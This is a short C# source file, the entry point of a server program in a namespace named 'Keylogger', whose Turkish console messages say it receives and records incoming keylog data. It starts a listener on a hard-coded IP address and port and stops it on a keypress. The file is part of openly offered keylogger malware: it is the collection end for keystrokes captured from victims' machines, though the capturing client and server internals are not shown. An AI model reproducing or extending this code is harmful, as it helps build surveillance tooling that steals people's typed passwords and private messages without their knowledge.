using System;
using System.Threading.Tasks;

namespace Keylogger
{
    class ServerApp
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("=== Keylogger Sunucu ===");
            Console.WriteLine("Bu sunucu gelen keylog verilerini alır ve kaydeder.");
            Console.WriteLine();

            var server = new SimpleServer("http://10.25.173.206:8080/");
            
            Console.WriteLine("Sunucu başlatılıyor...");
            Console.WriteLine("Çıkmak için 'q' tuşuna basın.");
            Console.WriteLine();

            // Sunucuyu arka planda başlat
            var serverTask = Task.Run(async () => await server.StartAsync());

            // Kullanıcı girişini bekle
            while (true)
            {
                var key = Console.ReadKey(true);
                if (key.KeyChar == 'q' || key.KeyChar == 'Q')
                {
                    break;
                }
            }

            Console.WriteLine("Sunucu kapatılıyor...");
            server.Stop();
            
            Console.WriteLine("Sunucu kapatıldı. Çıkmak için bir tuşa basın.");
            Console.ReadKey();
        }
    }
}